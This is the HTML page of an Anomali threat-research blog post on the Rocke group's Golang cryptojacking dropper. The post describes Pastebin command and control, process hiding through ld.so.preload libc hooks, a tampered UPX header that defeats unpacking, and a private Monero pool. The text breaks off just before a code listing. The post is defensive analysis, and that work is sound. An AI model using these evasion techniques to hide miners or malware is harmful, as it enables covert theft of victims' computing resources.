<!DOCTYPE html><html
dir="ltr" lang="en"><head><meta
charset="utf-8"><meta
http-equiv="X-UA-Compatible" content="IE=edge"><meta
name="viewport" content="width=device-width, initial-scale=1"><meta
name="referrer" content="no-referrer-when-downgrade">
<meta name="google-site-verification" content="riYkbs3fCzk0_BCgCPJdmKqTttlC0ZmTx5auF2nVzoQ" />
<meta name="msvalidate.01" content="46B1CAA2EC39379BA55C32802DCC1C62" />

<!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-38132735-1', 'anomali.com');
  ga('send', 'pageview');
</script>
    

<!-- Triblio -->
<script type='text/javascript' data-cfasync='false' src='//tribl.io/h.js?orgId=O8naez8e2eHPYn7m991b'></script>


<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
 fbq('init', '2115220198489652'); 
fbq('track', 'PageView');
</script>
<noscript>
 <img height="1" width="1" 
src="https://www.facebook.com/tr?id=2115220198489652&ev=PageView
&noscript=1"/>
</noscript>
<!-- End Facebook Pixel Code -->


<!-- Full Circle Digital Source Tracker -->
<script type="text/javascript" src="https://d2i34c80a0ftze.cloudfront.net/fullcircle.js?cid=89e085f3-5a30-494c-87ce-c5df4aacd29b&domain=anomali.com"></script>


<!-- ZoomInfo WebSights -->
<script>
(function() {
var zi = document.createElement('script');
zi.type = 'text/javascript';
zi.async = true;
zi.src = 'https://ws.zoominfo.com/pixel/2NTdNVxw8uLL0HhQZABg';
var s = document.getElementsByTagName('script')[0];
s.parentNode.insertBefore(zi, s);
})();
</script>
<noscript>
<img src="https://ws.zoominfo.com/pixel/2NTdNVxw8uLL0HhQZABg"
width="1" height="1" style="display: none;" />
</noscript>


<!-- TrenDemon Code -->
   <script type="text/javascript" id="trd-flame-load">
   TRD_ACC_ID = 2154;
    (function (w, d) {
         function go() {
            var trdti = setInterval(function () {
            if (document.readyState === "complete") {
                var bi = document.createElement("script"); bi.type = "text/javascript"; bi.async = true;
                bi.src = "https://assets.trendemon.com/tag/trends.min.js";
                bi.id  = "trdflame";
                var s  = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(bi, s);
                clearInterval(trdti);
                }
           }, 500);
        };
        go();
     }(window, document));
  </script>
<!-- End of TrenDemon Code --><title>Rocke Evolves Its Arsenal With a New Malware Family Written in Golang | Anomali Labs</title><meta
name="description" content="The “Rocke group”, a Chinese threat actor group who specializes in cryptojacking, has shifted gears on how they’re stealing your cycles."><meta
property="og:site_name" value="Anomali" /><meta
property="og:title" content="Rocke Evolves Its Arsenal With a New Malware Family Written in Golang | Anomali Labs"><meta
name="twitter:title" content="Rocke Evolves Its Arsenal With a New Malware Family Written in Golang | Anomali Labs"><meta
property="og:description" content="The “Rocke group”, a Chinese threat actor group who specializes in cryptojacking, has shifted gears on how they’re stealing your cycles."><meta
name="twitter:description" content="The “Rocke group”, a Chinese threat actor group who specializes in cryptojacking, has shifted gears on how they’re stealing your cycles."><meta
property="og:image" content="https://anomali.cdn.rackfoundry.net/images/made/images/uploads/blog/ogblog-rocke-group_1200_630.jpg" /><link
rel="alternate" type="application/rss+xml" title="Anomali Blog" href="https://www.anomali.com/site/blog-rss" /><meta
property="og:url" content="https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang" /><link
rel='canonical' href='https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang' /><meta
property="trd:title" content="[BLOG] Rocke Evolves Its Arsenal With a New Malware Family Written in Golang" /><meta
property="trd:image" content="https://anomali.cdn.rackfoundry.net/images/made/images/uploads/blog/trdblog-rocke-group_350_184_s_c1.jpg" /><link
href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&display=swap" rel="stylesheet"><link
rel="stylesheet" media="all" href="https://www.anomali.com/cache/e81fe80b777a82c7598ed9fce56d54999f8fbf37.1619117684.css">
<script>
function get_param_by_name(name) {
      name=name.replace(/[\[]/, "\[").replace(/[\]]/, "\]");
      var regex=new RegExp("[\?&]"+ name+"=([^&#]*)"),
      results=regex.exec(location.search);
      return results==null?"": decodeURIComponent(results[1].replace(/\+/g, " "));
  }
var cid=get_param_by_name('cid');
var utm_campaign=get_param_by_name('utm_campaign');
var internal_campaign=get_param_by_name('internal_campaign');
</script></head><body><div
class="main-container">
<header
id="anomali-header" class="anomali-header">
<nav
class="nav-top-level">
<div
class="container-fluid top-level nav-mobile d-block d-md-none"><div
id="nav-mobile-stage" class="nav-mobile-stage" aria-expanded="false"><div
class="nav-mobile-header"><div
class="row align-items-center no-gutters"><div
class="col-6">
<button
class="btn btn-link" type="button" data-toggle="menuNav"><i
class="fas fa-bars fa-lg" aria-hidden="true"></i><span
class="sr-only">Navigation</span></button></div><div
class="schedule-demo">
<a
href="/request-a-demo" class="btn btn-anomali btn-sm">Schedule Demo</a></div><div
class="col-6 anomali-logo">
<a
href="/" class="header-logo"><img
src="https://anomali.cdn.rackfoundry.net/assets/images/anomali-logo.svg" alt="Anomali" class="img-fluid"></a></div></div></div><div
class="accordion" id="mobileNavStage"><div
class="card"><div
class="card-header" id="heading-platform"><div
class="row"><div
class="col-9">
<a
href="/products" class="btn btn-link btn-block text-left">Products</a></div><div
class="col-3">
<button
class="anomali-accordion-button" type="button" data-toggle="collapse" data-target="#collapse-platform" aria-expanded="false" aria-controls="collapse-platform">
<i
class="fas fa-chevron-up fa-anomali-animate" aria-hidden="true"></i>
</button></div></div></div><div
id="collapse-platform" class="collapse" aria-labelledby="heading-platform" data-parent="#mobileNavStage"><div
class="card-body"><ul
class="nav-mobile-secondary-list"><li
class="nav-mobile-secondary-item"><a
href="/products/threatstream" class="nav-mobile-secondary-link">ThreatStream</a></li><li
class="nav-mobile-secondary-item"><a
href="/products/match" class="nav-mobile-secondary-link">Match</a></li><li
class="nav-mobile-secondary-item"><a
href="/products/lens" class="nav-mobile-secondary-link">Lens</a></li></ul></div></div></div><div
class="card"><div
class="card-header" id="heading-marketplace"><div
class="row"><div
class="col-9">
<a
href="/marketplace" class="btn btn-link btn-block text-left">Marketplace</a></div><div
class="col-3">
<button
class="anomali-accordion-button" type="button" data-toggle="collapse" data-target="#collapse-marketplace" aria-expanded="false" aria-controls="collapse-marketplace">
<i
class="fas fa-chevron-up fa-anomali-animate" aria-hidden="true"></i>
</button></div></div></div><div
id="collapse-marketplace" class="collapse" aria-labelledby="heading-marketplace" data-parent="#mobileNavStage"><div
class="card-body"><ul
class="nav-mobile-secondary-list"><li
class="nav-mobile-secondary-item"><a
href="/marketplace/threat-intelligence-feeds" class="nav-mobile-secondary-link">Threat Intelligence Feeds</a></li><li
class="nav-mobile-secondary-item"><a
href="/marketplace/threat-analysis-tools" class="nav-mobile-secondary-link">Threat Analysis Tools &amp; Enrichments</a></li><li
class="nav-mobile-secondary-item"><a
href="/marketplace/security-system-partners" class="nav-mobile-secondary-link">Security System Partners</a></li><li
class="nav-mobile-secondary-item"><a
href="/marketplace/sdks" class="nav-mobile-secondary-link">Anomali SDKs</a></li></ul></div></div></div><div
class="card"><div
class="card-header" id="heading-tis"><div
class="row"><div
class="col-9">
<a
href="/threat-intel-sharing" class="btn btn-link btn-block text-left">Intel Sharing</a></div></div></div></div><div
class="card"><div
class="card-header" id="heading-partners"><div
class="row"><div
class="col-9">
<a
href="/partners" class="btn btn-link btn-block text-left">Partners</a></div><div
class="col-3">
<button
class="anomali-accordion-button" type="button" data-toggle="collapse" data-target="#collapse-partners" aria-expanded="false" aria-controls="collapse-partners">
<i
class="fas fa-chevron-up fa-anomali-animate" aria-hidden="true"></i>
</button></div></div></div><div
id="collapse-partners" class="collapse" aria-labelledby="heading-partners" data-parent="#mobileNavStage"><div
class="card-body"><ul
class="nav-mobile-secondary-list"><li
class="nav-mobile-secondary-item"><a
href="/partners/channel-resellers" class="nav-mobile-secondary-link">Channel Resellers</a></li><li
class="nav-mobile-secondary-item"><a
href="/partners/mssps" class="nav-mobile-secondary-link">MSSPs</a></li><li
class="nav-mobile-secondary-item"><a
href="/partners/system-integrators" class="nav-mobile-secondary-link">System Integrators</a></li></ul></div></div></div><div
class="card"><div
class="card-header" id="heading-resources"><div
class="row"><div
class="col-9">
<a
href="/resources" class="btn btn-link btn-block text-left">Resources</a></div><div
class="col-3">
<button
class="anomali-accordion-button" type="button" data-toggle="collapse" data-target="#collapse-resources" aria-expanded="false" aria-controls="collapse-resources">
<i
class="fas fa-chevron-up fa-anomali-animate" aria-hidden="true"></i>
</button></div></div></div><div
id="collapse-resources" class="collapse" aria-labelledby="heading-resources" data-parent="#mobileNavStage"><div
class="card-body"><ul
class="nav-mobile-secondary-list"><li
class="nav-mobile-secondary-item"><a
href="/resources#datasheets" class="nav-mobile-secondary-link">Datasheets</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources#partner-datasheets" class="nav-mobile-secondary-link">Partner Datasheets</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources#videos" class="nav-mobile-secondary-link">Videos</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources#webinars" class="nav-mobile-secondary-link">Webinars</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources#whitepapers" class="nav-mobile-secondary-link">White Papers</a></li><li
class="nav-mobile-secondary-item"><a
href="/detect-live" class="nav-mobile-secondary-link">Detect LIVE</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources" class="nav-mobile-secondary-link">Browse all Resources</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/what-is-threat-intelligence" class="nav-mobile-secondary-link">What is Threat Intelligence?</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/sharing-threat-intelligence" class="nav-mobile-secondary-link">Threat Intelligence Sharing</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/what-is-a-tip" class="nav-mobile-secondary-link">Threat Intelligence Platform (TIP)</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/what-are-stix-taxii" class="nav-mobile-secondary-link">STIX/TAXII</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/what-mitre-attck-is-and-how-it-is-useful" class="nav-mobile-secondary-link">MITRE ATT&amp;CK</a></li><li
class="nav-mobile-secondary-item"><a
href="/learn/covid-19-resources" class="nav-mobile-secondary-link">COVID-19 Resources</a></li><li
class="nav-mobile-secondary-item"><a
href="/learn/sunburst" class="nav-mobile-secondary-link">Sunburst Resources</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/anomali-cyber-watch" class="nav-mobile-secondary-link">Anomali Cyber Watch</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/staxx" class="nav-mobile-secondary-link">STAXX</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/limo" class="nav-mobile-secondary-link">Limo</a></li><li
class="nav-mobile-secondary-item"><a
href="/resources/anomali-newsletter" class="nav-mobile-secondary-link">Anomali Newsletter</a></li></ul></div></div></div><div
class="card"><div
class="card-header" id="heading-company"><div
class="row"><div
class="col-9">
<a
href="/company" class="btn btn-link btn-block text-left">Company</a></div><div
class="col-3">
<button
class="anomali-accordion-button" type="button" data-toggle="collapse" data-target="#collapse-company" aria-expanded="false" aria-controls="collapse-company">
<i
class="fas fa-chevron-up fa-anomali-animate" aria-hidden="true"></i>
</button></div></div></div><div
id="collapse-company" class="collapse" aria-labelledby="heading-company" data-parent="#mobileNavStage"><div
class="card-body"><ul
class="nav-mobile-secondary-list"><li
class="nav-mobile-secondary-item"><a
href="/company/leadership" class="nav-mobile-secondary-link">Leadership</a></li><li
class="nav-mobile-secondary-item"><a
href="/news-events/press" class="nav-mobile-secondary-link">News &amp; Events</a></li><li
class="nav-mobile-secondary-item"><a
href="/company/awards" class="nav-mobile-secondary-link">Awards</a></li><li
class="nav-mobile-secondary-item"><a
href="/company/careers" class="nav-mobile-secondary-link">Careers</a></li><li
class="nav-mobile-secondary-item"><a
href="/company/contact-us" class="nav-mobile-secondary-link">Contact us</a></li></ul></div></div></div><div
class="card"><div
class="card-header" id="heading-blog">
<a
href="/blog" class="btn btn-link btn-block text-left">Blog</a></div></div><div
class="card"><div
class="card-header" id="heading-support">
<a
href="/customer-success" class="btn btn-link btn-block text-left">Support</a></div></div><div
class="card"><div
class="card-header" id="heading-signin">
<a
href="https://ui.threatstream.com/login" target="_blank" class="btn btn-link btn-block text-left">Sign In</a></div></div><div
class="card"><div
class="card-header schedule-demo" id="heading-schedule">
<a
href="/request-a-demo" class="btn btn-anomali btn-block">Schedule Demo</a></div></div></div></div></div><div
class="nav-sticky"><div
class="container"><div
class="row"><div
class="top-level-home col-sm-3">
<a
href="/" class="header-logo"><img
src="https://anomali.cdn.rackfoundry.net/assets/images/anomali-logo.svg" alt="Anomali"></a></div><div
class="top-level-nav text-right col-sm-9"><ul
class="nav-content list-inline"><li
class="nav-content-item list-inline-item"><a
href="/request-a-demo" class="btn btn-anomali btn-sm">Schedule Demo</a></li></ul></div></div></div></div><div
class="container top-level nav-desktop d-none d-md-block"><div
class="row no-gutters"><div
class="top-level-home col-sm-3">
<a
href="/" class="header-logo"><img
src="https://anomali.cdn.rackfoundry.net/assets/images/anomali-logo.svg" alt="Anomali"></a></div><div
class="top-level-nav col-sm-9"><ul
class="nav-content list-inline"><li
class="nav-content-item list-inline-item"><div
class="dropdown anomali-dropdown-header">
<button
class="btn btn-link dropdown-toggle" type="button" id="header-languageSelector" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">English</button><div
class="dropdown-menu" aria-labelledby="header-languageSelector">
<a
class="dropdown-item" href="/">English</a>
<a
class="dropdown-item" href="/fr">Français</a>
<a
class="dropdown-item" href="/de">Deutsch</a>
<a
class="dropdown-item" href="/jp">日本語</a>
<a
class="dropdown-item" href="/it">Italiano</a>
<a
class="dropdown-item" href="/pt">Português</a>
<a
class="dropdown-item" href="/ru">Русский</a>
<a
class="dropdown-item" href="/es">Español</a></div></div></li><li
class="nav-content-item list-inline-item"><a
href="/blog">Blog</a></li><li
class="nav-content-item list-inline-item"><a
href="/customer-success">Support</a></li><li
class="nav-content-item list-inline-item"><a
href="https://ui.threatstream.com/login" target="_blank">Sign In</a></li><li
class="nav-content-item list-inline-item"><a
href="/request-a-demo" class="btn btn-anomali btn-sm">Schedule Demo</a></li></ul></div></div><div
class="main-navigation"><ul
class="main-nav-content list-inline"><li
class="list-inline-item"><a
href="/products" class="main-nav-content-item " data-navid="platform">Products</a></li><li
class="list-inline-item"><a
href="/marketplace" class="main-nav-content-item " data-navid="marketplace">Marketplace</a></li><li
class="list-inline-item"><a
href="/threat-intel-sharing" class="main-nav-content-item " data-navid="threatintelsharing">Intel Sharing</a></li><li
class="list-inline-item"><a
href="/partners" class="main-nav-content-item " data-navid="partners">Partners</a></li><li
class="list-inline-item"><a
href="/resources" class="main-nav-content-item  " data-navid="resources">Resources</a></li><li
class="list-inline-item"><a
href="/company" class="main-nav-content-item  " data-navid="company">Company</a></li></ul></div></div><div
class="navigation-secondary container-fluid"><div
class="nav-secondary-item container" data-navid="platform"><div
class="row"><div
class="nav-secondary-col-left col-5"><div
class="my-4 mr-3 ml-0"><h2>Anomali Product Suite</h2><p>Anomali intelligence-driven security products provide unmatched threat visibility and accelerated detection, allowing customers to reduce the risk of security breaches and improve security team productivity.</p><div><a
href="/products" class="btn btn-link-anomali btn-no-pad">Learn more</a></div></div></div><div
class="nav-secondary-col-right col-7"><div
class="my-4 mr-0 ml-2"><div
class="row"><div
class="col-12"><h2>Our Products</h2><div
class="nav-secondary-col-item"><h4><a
href="/products/threatstream" class="btn btn-link-anomali btn-no-pad text-left">ThreatStream</a></h4><p
class="desc">Operationalize your threat intelligence under a single platform to speed the detection of threats and enable proactive defense measures.</p></div><div
class="nav-secondary-col-item"><h4><a
href="/products/match" class="btn btn-link-anomali btn-no-pad text-left">Match</a></h4><p
class="desc">Automate the detection of threats in your network by continuously correlating all available threat intelligence against all your event logs.</p></div><div
class="nav-secondary-col-item"><h4><a
href="/products/lens" class="btn btn-link-anomali btn-no-pad text-left">Lens</a></h4><p
class="desc">Access threat intelligence knowledge at your fingertips, identify new and known threats, and understand if you’ve been impacted – in seconds.</p></div></div></div></div></div></div></div><div
class="nav-secondary-item container" data-navid="marketplace"><div
class="row"><div
class="nav-secondary-col-left col-5"><div
class="my-4 mr-3 ml-0"><h2>The Anomali App Store</h2><p>A unique cybersecurity marketplace providing instant access to a growing catalog of threat intelligence providers, integration partners, and threat analysis tools.</p><div><a
href="/marketplace" class="btn btn-link-anomali btn-no-pad">Learn more</a></div></div></div><div
class="nav-secondary-col-right col-7"><div
class="my-4 mr-0 ml-2"><div
class="row"><div
class="col-6"><h2>Marketplace Offerings</h2><div
class="nav-secondary-col-item"><h4><a
href="/marketplace/threat-intelligence-feeds" class="btn btn-link-anomali btn-no-pad text-left">Threat Intelligence Feeds</a></h4><p
class="desc">Trial and purchase threat intelligence feeds from Anomali partners – find the right intelligence for your organization, industry, geography, threat type, and more.</p></div><div
class="nav-secondary-col-item"><h4><a
href="/marketplace/threat-analysis-tools" class="btn btn-link-anomali btn-no-pad text-left">Threat Analysis Tools &amp; Enrichments</a></h4><p
class="desc">Gain the tools to pivot quickly from one piece of information to look up other sources of data to get a complete picture of a threat – all one click away.</p></div><div
class="nav-secondary-col-item"><h4><a
href="/marketplace/security-system-partners" class="btn btn-link-anomali btn-no-pad text-left">Security System Partners</a></h4><p
class="desc">Anomali seamlessly integrates with many Security and IT systems to operationalize threat intelligence.</p></div></div><div
class="col-6"><h2>For Partners</h2><div
class="nav-secondary-col-item">
<a
href="/marketplace/sdks" class="btn btn-link-anomali btn-no-pad text-left mb-2">Anomali SDKs</a></div><div
class="nav-secondary-col-item">
<a
href="/marketplace" class="btn btn-link-anomali btn-no-pad text-left">Become an APP Store Partner</a></div></div></div></div></div></div></div><div
class="nav-secondary-item container" data-navid="partners"><div
class="row"><div
class="nav-secondary-col-left col-5"><div
class="my-4 mr-3 ml-0"><h2>Partners Overview</h2><p>Anomali offers competitive advantages and new revenue opportunities for partners looking to enhance their product portfolios with our market-leading threat intelligence platform.</p><div><a
href="/partners" class="btn btn-link-anomali btn-no-pad">Learn more</a></div></div></div><div
class="nav-secondary-col-right col-7"><div
class="my-4 mr-0 ml-2"><div
class="row"><div
class="col-6"><h2>Apply Today</h2><div
class="nav-secondary-col-item">
<a
href="/partners/channel-resellers" class="btn btn-link-anomali btn-no-pad text-left mb-2">Channel Resellers</a></div><div
class="nav-secondary-col-item">
<a
href="/partners/mssps" class="btn btn-link-anomali btn-no-pad text-left mb-2">MSSPs</a></div><div
class="nav-secondary-col-item">
<a
href="/partners/system-integrators" class="btn btn-link-anomali btn-no-pad text-left">System Integrators</a></div></div></div></div></div></div></div><div
class="nav-secondary-item container" data-navid="resources"><div
class="row"><div
class="nav-secondary-col-left col-5"><div
class="my-4 mr-3 ml-0"><h2>Featured Research</h2><div
id="nav-resources-promo">
<a
href="/learn/sunburst"><img
src="https://anomali.cdn.rackfoundry.net/images/uploads/home/promos/promo-sunburst.jpg" alt="Understand the Sunburst Attack" class="img-fluid" style="width:350px"></a></div></div></div><div
class="nav-secondary-col-right col-7"><div
class="my-4 mr-0 ml-2"><div
class="row"><div
class="col-4"><h2>Resources</h2><div
class="nav-secondary-col-item">
<a
href="/resources#data-sheet" class="btn btn-link-anomali btn-no-pad text-left mb-2">Datasheets</a></div><div
class="nav-secondary-col-item">
<a
href="/resources#partner-data-sheet" class="btn btn-link-anomali btn-no-pad text-left mb-2">Partner Datasheets</a></div><div
class="nav-secondary-col-item">
<a
href="/resources#video" class="btn btn-link-anomali btn-no-pad text-left mb-2">Videos</a></div><div
class="nav-secondary-col-item">
<a
href="/resources#webinar" class="btn btn-link-anomali btn-no-pad text-left mb-2">Webinars</a></div><div
class="nav-secondary-col-item">
<a
href="/resources#whitepaper" class="btn btn-link-anomali btn-no-pad text-left mb-2">White Papers</a></div><div
class="nav-secondary-col-item">
<a
href="/detect-live" class="btn btn-link-anomali btn-no-pad text-left mb-2">Detect LIVE</a></div><div
class="nav-secondary-col-item"><h4><a
href="/resources" class="btn btn-link-anomali btn-no-pad text-left">Browse all</a></h4></div></div><div
class="col-4"><h2>Topics</h2><div
class="nav-secondary-col-item">
<a
href="/resources/what-is-threat-intelligence" class="btn btn-link-anomali btn-no-pad text-left mb-2">What is Threat Intelligence?</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/sharing-threat-intelligence" class="btn btn-link-anomali btn-no-pad text-left mb-2">Threat Intelligence Sharing</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/what-is-a-tip" class="btn btn-link-anomali btn-no-pad text-left mb-2">Threat Intelligence Platform (TIP)</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/what-are-stix-taxii" class="btn btn-link-anomali btn-no-pad text-left mb-2">STIX/TAXII</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/what-mitre-attck-is-and-how-it-is-useful" class="btn btn-link-anomali btn-no-pad text-left">MITRE ATT&CK</a></div><div
class="nav-secondary-col-item">
<a
href="/learn/covid-19-resources" class="btn btn-link-anomali btn-no-pad text-left">COVID-19 Resources</a></div><div
class="nav-secondary-col-item">
<a
href="/learn/sunburst" class="btn btn-link-anomali btn-no-pad text-left">Sunburst Resources</a></div></div><div
class="col-4"><h2>Free Tools</h2><div
class="nav-secondary-col-item">
<a
href="/resources/anomali-cyber-watch" class="btn btn-link-anomali btn-no-pad text-left mb-2">Anomali Cyber Watch</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/staxx" class="btn btn-link-anomali btn-no-pad text-left mb-2">STAXX</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/limo" class="btn btn-link-anomali btn-no-pad text-left mb-2">Limo</a></div><div
class="nav-secondary-col-item">
<a
href="/resources/anomali-newsletter" class="btn btn-link-anomali btn-no-pad text-left">Anomali Newsletter</a></div></div></div></div></div></div></div><div
class="nav-secondary-item container" data-navid="company"><div
class="row"><div
class="nav-secondary-col-left col-5"><div
class="my-4 mr-3 ml-0"><h2>About Anomali</h2><p>Anomali delivers intelligence-driven cybersecurity solutions, including ThreatStream®, Match™, and Lens™. Companies use Anomali to enhance threat visibility, automate threat processing and detection, and accelerate threat investigation, response, and remediation.</p><div><a
href="/company" class="btn btn-link-anomali btn-no-pad">Learn more</a></div></div></div><div
class="nav-secondary-col-right col-7"><div
class="my-4 mr-0 ml-2"><div
class="row"><div
class="col-6"><h2>Anomali at Work</h2><div
class="nav-secondary-col-item">
<a
href="/company/leadership" class="btn btn-link-anomali btn-no-pad text-left mb-2">Leadership</a></div><div
class="nav-secondary-col-item">
<a
href="/news-events/events" class="btn btn-link-anomali btn-no-pad text-left mb-2">Events</a></div><div
class="nav-secondary-col-item">
<a
href="/news-events/press" class="btn btn-link-anomali btn-no-pad text-left mb-2">Press Releases</a></div><div
class="nav-secondary-col-item">
<a
href="/news-events/in-the-news" class="btn btn-link-anomali btn-no-pad text-left mb-2">In the News</a></div><div
class="nav-secondary-col-item">
<a
href="/company/awards" class="btn btn-link-anomali btn-no-pad text-left mb-2">Awards</a></div></div><div
class="col-6"><h2>Get in touch</h2><div
class="nav-secondary-col-item">
<a
href="/company/contact-us" class="btn btn-link-anomali btn-no-pad mb-2">Contact us</a></div><div
class="nav-secondary-col-item">
<a
href="/request-a-demo" class="btn btn-link-anomali btn-no-pad mb-2">Request a demo</a></div><div
class="nav-secondary-col-item">
<a
href="/company/careers" class="btn btn-link-anomali btn-no-pad text-left mb-2">Careers</a></div></div></div></div></div></div></div></div>
</nav><div
class="anomali-header-stage default" style="background-image:url(https://anomali.cdn.rackfoundry.net/images/uploads/blog/blog-rocke-group.jpg)"><div
class="bg-overlay"></div><div
class="jumbotron jumbotron-fluid"><div
class="container"><div
class="row align-items-center"><div
class="col-md-12"><h1 class="headline">Rocke Evolves Its Arsenal With a New Malware Family Written in Golang</h1></div></div></div></div></div>
</header><div
class="body-content"><div
class="anomali-section-stage anomali-section-white pt-2"><div
class="module-blog-article">
<article
class="blog-entry"><div
class="article-meta">
<img
src="https://anomali.cdn.rackfoundry.net/images/avatars/avatar_6.png" alt="Anomali Threat Research" class="article-author-img" /><div
class="article-author-line">
<span
class="author">By: Anomali Threat Research</span>
<span
class="date float-right">March 15, 2019</span></div></div><div
class="row justify-content-md-center position-relative"><div
class="sidebar"><div
class="social-sharing fixed">
<a
onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;" href="https://www.facebook.com/sharer/sharer.php?u=https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang" title="Share on Facebook" target="_blank" class="fb"><i
class="fab fa-facebook-square fa-3x" aria-hidden="true"></i></a>
<a
onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;" href="https://twitter.com/intent/tweet?text=Rocke Evolves Its Arsenal With a New Malware Family Written in Golang&via=Anomali&ref_src=Anomali&original_referer=https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang&url=https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang" title="Share on Twitter" target="_blank" class="tw"><i
class="fab fa-twitter-square fa-3x"></i></a>
<a
onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;" href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang&title=Rocke Evolves Its Arsenal With a New Malware Family Written in Golang&summary=&source=Anomali" title="Share on LinkedIn" target="_blank" class="in"><i
class="fab fa-linkedin fa-3x" aria-hidden="true"></i></a></div></div><div
class="col-lg-10"><div
class="article-body"><div
class="article-category mt-1 mb-2"><p
class="d-inline">Category:</p><a
href="/blog/category/research" title="View all posts in Research">Research</a>
&#8203;</div><div
class="article-text"><h2>Summary</h2><p>The &ldquo;Rocke group&rdquo;, a Chinese threat actor group who specializes in cryptojacking, has shifted gears on how they&rsquo;re stealing your cycles. Rocke is actively updating and pushing a new dropper using Pastebin for Command and Control (C2). Recent updates to the C2 as of March 13th, 2019 have been seen, which leads researchers to believe this campaign is ongoing. According to VirusTotal, the threat detection of the new dropper is nearly non-existent. The group has been observed in previous campaigns to use &ldquo;ld.so.preload&rdquo; function to hook libc functions. The hooking is used to hide the dropper and the mining software installed by the malware and prevents it from showing up in the &ldquo;currently running&rdquo; process list. This tactic is being utilized by the group in this new campaign. The miner uses a private mining pool hosted on DigitalOcean which is a change in the threat actor&rsquo;s previous tactics.</p><h2>Introduction</h2><p>The threat actor group, Rocke, was first reported by Cisco Talos in August 2018.[1] On January 17th, 2019, Palo Alto Networks&rsquo; Unit 42 reported on a campaign conducted by the group that was active in October 2018, in which the group utilized a malware written in Python to orchestrate the infection and spreading of their coinminer.[2] On March 12th, 2019, Anomali Research has, with high confidence, identified a new active campaign that we believe is being conducted by Rocke. The objective of the campaign, similar to other Rocke activity, is to drop a miner onto a machine to mine Monero cryptocurrency. This ongoing campaign has extensive Tactics Techniques and Procedures (TTPs) that overlap with the report published by Unit 42.</p><p>This campaign is different from prior activity because a new dropper was observed being used by Rocke that is written in Go (Golang) instead of Python. The detection for the malware on VirusTotal (VT) is nearly non-existent. Figure 1, below, shows the detections for the most recent sample submitted to VT. It can be seen that only one engine successfully detected it as malicious. The low detection rate of the malware coupled with the techniques that prevent the Rocke malicious processes from showing up in the running processes of victim machines, raises the possibility that this campaign has been successfully running for weeks.</p><p
style="text-align: center;"><em><img
alt="Scanning results from VirusTotal for one of the malware samples" src="https://anomali.cdn.rackfoundry.net/images/uploads/blog/VirusTotal.png" /><br
/>
Figure 1: Scanning results from VirusTotal for one of the malware samples.</em></p><h2>Technical Details</h2><h3>Analysis of the Dropper</h3><p>The samples analyzed are packed with UPX. The UPX header has been modified to break the unpacker provided by the UPX project. Instead of having the &ldquo;UPX!&rdquo; string, it has been replaced with &ldquo;LSD!&rdquo;. Repairing the header is needed to unpack the samples using the unpacker provided by the UPX team.</p><p>The dropper is written in Go (Golang) and the estimated source code structure, based on the decompiler, is shown below:</p><pre>
